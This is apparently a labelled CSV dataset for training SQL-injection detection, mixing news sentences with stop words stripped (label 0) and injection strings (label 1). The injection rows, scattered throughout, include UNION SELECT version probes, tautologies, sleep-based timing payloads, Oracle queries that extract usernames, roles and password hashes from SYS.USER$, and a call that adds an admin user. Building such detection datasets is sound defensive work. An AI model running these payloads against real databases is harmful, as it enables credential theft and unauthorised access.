Sentence,Label
This also applies case victims,0
Seven points added licence resulted receiving six-month driving ban,0
"They unable visit two sites security concerns , inspectors said",0
He said: &quot; I really want develop invisible ice cream,0
"select * from users where id = 1 +\. union select null,@@VERSION -- 1",1
"select * from users where id = 1 or  1<@ = 1 union select 1,version (  )  -- 1",1
In September began giving half many frequent flier miles customers bought online travel agency,0
"select * from users where id = 1 or ""1]"" or 1 = 1 -- 1",1
The tunnel eighth major passage discovered San Diego since 2006,0
"Miller said direct connection Bulgaria , member European Union , means geopolitical risks associated transit countries eliminated &quot; forever",0
"An institution lengthened shadow one man; as, Monachism, Hermit Antony; Reformation, Luther; Quakerism, Fox; Methodism, Wesley; Abolition, Clarkson",0
"Traditionally , anniversary celebration also always fitting occasion bestow honours",0
"&quot; I would curious would happen measure Roberto Blanco , &quot; said Jumbo cynically",0
The letter extends offer cooperate German authorities &quot; difficulties humanitarian situation resolved,0
News reports NSA swept millions phone records Europe frayed relations U,0
"According information police , 41-year-old Müsch travelling car Kempener bypass direction Grefrath , around 9",0
"select * from users where id = 1 or !<@ union select 1,version (  )  -- 1",1
"Experts say violence left 14 adults seven children dead nothing random chance , sign growing violence America",0
"In developments , Observatory &apos;s chief Rami Abdurrahman said strong explosion Wednesday inside air defense facility Syria &apos;s coastal province Latakia",0
"chemical weapons program items contained moved declared sites , inspected",0
Kenya media drew ire authorities broadcasting security camera footage troops dispatched scene attack purportedly robbing upmarket mall,0
pg_sleep ( __TIME__ ) --,1
&quot; The rep adds: &quot; Perhaps confusing someone else,0
"In pleasing, contrite wood-life God allows me, let record day day honest thought without prospect retrospect, and, I cannot doubt, found symmetrical, though I mean not, see not",0
"Staff gave evidence observed breaches including Lord alone children , babysitting privately , sit lap , saying loved one letting play mobile phone",0
&quot; We &apos;ve able scrub surgeries help blot blood away hold tools Dr,0
select * from users where id = '1' + $+%\ or 1 = 1 -- 1',1
limit,1
select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1,1
"The rabbit show , however , open visitors 10: 00 a",0
Airbus offers 10-abreast A350 says yet sold,0
Gönningen found extremely difficult cope hard well-positioned offensive moves,0
Hence millions people across region turning pawnshops families feel squeeze rising living costs ballooning household consumer debt,0
"But feminine rage indignation people added, ignorant poor aroused, unintelligent brute force lies bottom society made growl mow, needs habit magnanimity religion treat godlike trifle concernment",0
$ ( sleep 50 ),1
"As airport spokesperson Peter Kleeman announced Radio Vienna adjusting approach towards announcements , Vienna Airport following international trend",0
"select * from users where id = 1 or 1#""? union select 'a',version (  )  -- 1",1
"Do I know beforehand possibly say new spontaneous word? Do I know that, ostentation examining grounds institution, thing? Do I know pledged look one side, — permitted side, man, parish minister? He retained attorney, airs bench emptiest affectation",0
"According authorities , ladder runs 20 metres underground actual entrance tunnel",0
The water rail put helicopter Aberdeen last month nursed back health Scottish SPCA rescue centre Alloa,0
"Character, reality, reminds nothing else; takes place whole creation",0
"select * from users where id = 1 +1<@ union select null,version (  )  -- 1",1
"It horses found admired grounds , many animals sheep , goats , cows chickens well",0
"The ice cream harnesses fluorescent properties jellyfish , synthesized Chinese scientists Freudenstadt: Quick moves take hosts surprise With slender squad , TSV Freudenstadt Herren I team (Men &apos;s First Team) stepped Schiller School Gymnasium Reutlingen face TG Gönningen Swabian Alb region",0
Patek last Bali bombers face justice,0
"People saying &quot; gold price looks good , let &apos;s pawn grandma &apos;s gold chain get back next month",0
But Dr,0
"Meanwhile , U",0
"There resentment among local residents old town , repeatedly suffer result overflowing canal network , even normal thunderstorms",0
)  or  ( 'x' = 'x,1
"If Europe &apos;s powerful person targeted , surely business leaders also potential targets",0
"The Vatican wants know Catholic parishes around globe handle sensitive issues like contraception , divorce gay couples",0
"select * from users where id = 1 or 1#""; = 1 union select 1,version (  )  -- 1",1
"The role Santiago , old man Hemingway &apos;s novel &quot; The Old Man Sea &quot; , perfectly suited Horst Janson",0
"&quot; They believe defies logic , laws physics well common sense , &quot; Crump said",0
British scientists said results interesting warned far research needed,0
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.DATABASE_NAME FROM DUAL  )  )   AND 'i' = 'i,1
"select * from users where id = 1.*\ union select null,@@VERSION -- 1",1
German media say BfV hoped identify presence listening antennas action prompted exchange US German foreign ministry Berlin,0
"In opinion , district &apos;s advantage location advantageous location south-west Germany , immediate proximity France Switzerland",0
"I wish sound sweet, need diet bleeding",0
"&quot; No one ever know , &quot; wrote Nation journalist Mutuma Mathiu , describing Kenyan media key source checks balances public life",0
"Santiago &apos;s cabin bar singer Marie-Luise Gunst , sings Cuban lifestyle , songs beautiful voice",0
"&quot; The greater hope well truly cast Christians religious critics , &quot; said speaker",0
"Other committee members said anecdotal reports pilots support devices interfere aircraft systems , reports old",0
select * from users where id = 1 +$+ or 1 = 1 -- 1,1
"select * from users where id = '1' + @ 1 union select 1,version (  )  -- 1'",1
"select * from users where id = '1' union select 1,banner from v$version where rownum = 1 -- 1'",1
A large infra-red telescope space could penetrate darkness,0
' and 1 in  ( select var from temp ) --,1
"Should mother alarmed daughter begins sprout breast buds pubic hair 7 8 ? At annual conference American Academy Pediatrics week Orlando , Florida , pediatric endocrinologist Dr",0
Endurance pays dividends Six teams battled become champion club tennis tournament,0
"To believe thought, believe true private heart true men, — genius",0
"I felt second term Obama , free pressures future elections , would fulfill hope heard long",0
"The Büchner prizewinner known primarily writer prose , theatre texts something rarity",0
""" or ""a"" = ""a",1
or 'text'  =  n'text',1
""" or """"&""",1
"select * from users where id = 1 or "" ( 1"" or 1 = 1 -- 1",1
"&quot; This expense offloaded , &quot; Maier glad say",0
It also says research shows cabin experience depends width seat,0
""" or sleep ( __TIME__ ) #",1
"For large companies , message long since drummed home picking free USB stick trade fair , leaving laptop unguarded hotel room unwise , say least",0
"Fearful future country , swapped corporate attire T-shirt emblazoned &quot; demand security &quot; Portuguese joined crowds capital &apos;s Independence Square Thursday",0
Nor types people use pawnbrokers financially stretched,0
"select * from users where id = 1 or ""?%"" or 1 = 1 -- 1",1
"Issuing statements regarding Merkel spying scandal Russia The former US intelligence expert , Edward Snowden , may make statements regarding US espionage scandal involving Federal Chancellor , Angela Merkel , Russian asylum",0
' )  or true--,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
"With savings , donations mortgage old workshop , set Los Angeles ship",0
"On occasion World vegan Day 1 November , Vegetarian Association Germany propose host vegan alternatives: Pure plant margarine good alternative butter , yoghurt replaced soya yoghurt",0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
&quot; During arrest Ditta picked wallet tried remove several credit cards seized hair sample taken fom,0
"He said: &quot; In cases , reached far inappropriately",0
) s,1
"Really , guy get death penalty anybody",0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
"In 1970s , city fathers wanted car-friendly city , therefore sections old city wall remain tall",0
"RBS suspends two forex traders Royal Bank Scotland suspended two traders foreign exchange division according two people familiar situation , another sign global probe regulators suspected manipulation currency market rapidly gaining traction",0
"The jack-o-lantern slowly withering front porch probably came Illinois , grew 542 million pounds pumpkin year",0
"It said Malaysia , Thailand Singapore highest household debt gross domestic product ratios Asia",0
"It recently previewed may start new ad war showing financiers slide illustrating three people squashed together restaurant , titled &quot; Would You Accept This ? &quot; &quot; Boeing proposing long-distance flying seats narrower regional turbo-props , &quot; said Airbus sales chief John Leahy",0
House fire Helmbrechts: Rescue services retrieve charred body The fire service called Helmbrechts late Thursday evening,0
She keep looking found ideal property husband,0
One major reason upcoming price increase rise so-called EEC Levy 5,0
"select * from users where id = 1 * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1 union select @ 1a,version (  )  -- 1",1
"Yesterday , Obama tweaked original pledge",0
"select * from users where id = 1 or ""$@"" or 1 = 1 -- 1",1
Mrs Howells said: &quot; The whole place electric everybody cheering clapping,0
She afraid move spider front door,0
"The relationship talking simply drug dealer , drug dealer providing lawyer drugs",0
"select * from users where id = 1 or ""%;"" or 1 = 1 -- 1",1
Grießhaber therefore suggested required supporting wall constructed way town could due course widen adjoining street order guarantee smooth flow traffic,0
"Australian diplomats played key role pushing &quot; sustainable development goals &quot; replace MDGs , expire 2015 , ahead UN sustainable development summit began Rio de Janeiro overnight",0
"In future may difficult fill positions sparsely populated outlying areas Harz , Emsland Wendland",0
"Representatives German Federal Prosecutor &apos;s Office could either submit questions writing meet 30-year-old person Russia , reported Interfax Agency",0
"He kept income women , worked years",0
"It &apos;s investigating allegations Mr Tripodi knew Mr Obeid &apos;s secret interest properties , evidence given Mr Tripodi &apos;s former deputy chief staff , Lynne Ashpole , Thursday",0
"Music makes entertaining afternoon It 15 years ago Kaul family first invited Dietingen senior citizens coffee cake , followed snack",0
"The meeting point one half hour tour Nuclear Bunder Museum , 3: 00 p",0
‘ or 3 = 3 --,1
"Children taught myths legends &quot; models way life &quot; , author says",0
"That person receive $ 250,000 continue extraordinary work",0
"&quot; We seek reward , except reward history critical time serve community , &quot; said",0
"For young people today , career attractive offers good future prospects , said Pastor Mathis Burfien (43) conversation Protestant Press Service",0
They look good teamwork pony handler - Fenton Toffee best ring,0
"Economists also worried high levels consumer debt Thailand , week narrowly emerged technical recession",0
"For long periods , Janson performer stage",0
"Otherwise BVB impose sanction end next week , said Watzke",0
"select * from users where id = 1 union select .1_,version (  )  -- 1",1
"select * from users where id = 1 or 1#""1 union select 'a',version (  )  -- 1",1
The Alb men stood side net undoubtedly experienced team,0
"select * from users where id = 1 or ""; ) "" = 1 or 1 = 1 -- 1",1
"&quot; I salute fortitude courage &apos;ve demonstrated fulfilling challenging mission ever undertaken organization , &quot; watchdog &apos;s director-general , Ahmet Uzumcu , said comments released OPCW",0
"Meanwhile , 35-year-old Sri Lankan asylum seeker died suspected heart attack arriving asylum boat Christmas Island week",0
"Others might receive crutches , pair donated eyeglasses free birth certificates -- documentation &apos;s required school many impoverished families simply &apos;t afford",0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
"select * from users where id = 1 or 1#"". union select 1,version (  )  -- 1",1
"Living future-oriented perspective If truth told , Waltraud Ries , lives dreamy life",0
"Two days later , half stock dealing USA came standstill several hours , due computer failure Nasdaq exchange",0
"Still , analysts skeptical first customer begin operating CSeries plane 12 months maiden flight",0
"select * from users where id = '1' union select +\.,@@VERSION -- 1'",1
"After losing Rockstar Nortel patents , Google went acquire Motorola Mobility $ 12",0
The science knowing child develop gender identity accurate,0
"Kaplowitz cautious medication acknowledges , &quot; suppressing puberty may alleviate behavioral issues girls &apos; feelings different peers",0
"While boasting comfort , builders also offer jets high-density layouts low-cost airlines regional travel",0
"The instability added frustrations government , says Fernando Lima , head Mediacoop , independent media company , many people also concerned corruption , slow pace development recent spate kidnappings",0
"select * from users where id = 1 or ""$?"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""1["" or 1 = 1 -- 1",1
"select * from users where id = 1 or "";_"" or 1 = 1 -- 1",1
21 %,1
"select * from users where id = 1 or ""@?"" or 1 = 1 -- 1",1
"As recently last Tuesday , Nasdaq indices calculated one hour due data transfer errors",0
"' || myappadmin.adduser ( 'admin', 'newpass' )  || '",1
